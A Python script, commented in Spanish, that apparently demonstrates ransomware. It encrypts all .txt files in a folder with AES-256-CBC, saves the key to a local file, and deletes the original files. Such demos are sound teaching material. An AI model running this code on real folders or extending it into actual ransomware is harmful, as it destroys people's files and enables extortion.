import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# 📍 Directorio a cifrar (¡Cambia esto según tu ruta!)
folder_path = "archivos"

# 🔹 Generar clave y vector de inicialización (IV)
key = get_random_bytes(32)  # AES-256 requiere 32 bytes
iv = get_random_bytes(16)    # CBC requiere un IV de 16 bytes

# Guardar clave en un archivo (¡En un ransomware real, esto no se haría!)
with open("clave.key", "wb") as key_file:
    key_file.write(key)

def encrypt_file(file_path, key, iv):
    with open(file_path, "rb") as f:
        plaintext = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    with open(file_path + ".enc", "wb") as f:
        f.write(iv + ciphertext)  # Guardamos IV junto con el cifrado
    
    os.remove(file_path)  # Eliminar archivo original (simulación de ransomware)

# 🔹 Cifrar todos los archivos .txt en la carpeta
for filename in os.listdir(folder_path):
    file_path = os.path.join(folder_path, filename)
    if filename.endswith(".txt"):
        encrypt_file(file_path, key, iv)
        print(f"Archivo cifrado: {filename}")

print("Todos los archivos han sido cifrados!")
